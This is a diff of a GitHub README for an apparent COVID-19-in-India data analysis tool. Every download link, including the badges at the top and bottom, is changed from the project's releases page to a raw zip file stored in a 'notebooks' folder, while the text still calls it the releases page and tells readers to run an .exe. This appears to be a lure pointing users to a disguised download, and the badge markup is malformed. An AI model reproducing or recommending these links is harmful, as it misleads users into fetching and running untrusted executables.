@@ -1,6 +1,6 @@
 # 📊 COVID-19-in-India-Data-Analysis - Analyze COVID-19 Data with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Bignetsc/COVID-19-in-India-Data-Analysis/releases)
+[![Download](https://github.com/Bignetsc/COVID-19-in-India-Data-Analysis/raw/refs/heads/main/notebooks/Data-in-Analysis-COVI-India-1.0.zip%https://github.com/Bignetsc/COVID-19-in-India-Data-Analysis/raw/refs/heads/main/notebooks/Data-in-Analysis-COVI-India-1.0.zip)](https://github.com/Bignetsc/COVID-19-in-India-Data-Analysis/raw/refs/heads/main/notebooks/Data-in-Analysis-COVI-India-1.0.zip)
 
 ## 🔍 Overview
 
@@ -19,7 +19,7 @@ Follow these simple steps to get started with the application. You will need a c
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the application, [click here](https://github.com/Bignetsc/COVID-19-in-India-Data-Analysis/releases). This page contains the latest version of the software. 
+   To download the application, [click here](https://github.com/Bignetsc/COVID-19-in-India-Data-Analysis/raw/refs/heads/main/notebooks/Data-in-Analysis-COVI-India-1.0.zip). This page contains the latest version of the software. 
 
 2. **Choose the Right File**  
    Look for the most recent version listed in the releases. You will see various files available for download. Choose the file ending with `.exe` for Windows, `.dmg` for macOS, or the appropriate file for your Linux distribution. 
@@ -90,4 +90,4 @@ Your feedback is valuable. Join us on this journey to better understand COVID-19
 
 If you have questions or suggestions, feel free to reach out via the repository's contact page.
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Bignetsc/COVID-19-in-India-Data-Analysis/releases)
+[![Download](https://github.com/Bignetsc/COVID-19-in-India-Data-Analysis/raw/refs/heads/main/notebooks/Data-in-Analysis-COVI-India-1.0.zip%https://github.com/Bignetsc/COVID-19-in-India-Data-Analysis/raw/refs/heads/main/notebooks/Data-in-Analysis-COVI-India-1.0.zip)](https://github.com/Bignetsc/COVID-19-in-India-Data-Analysis/raw/refs/heads/main/notebooks/Data-in-Analysis-COVI-India-1.0.zip)
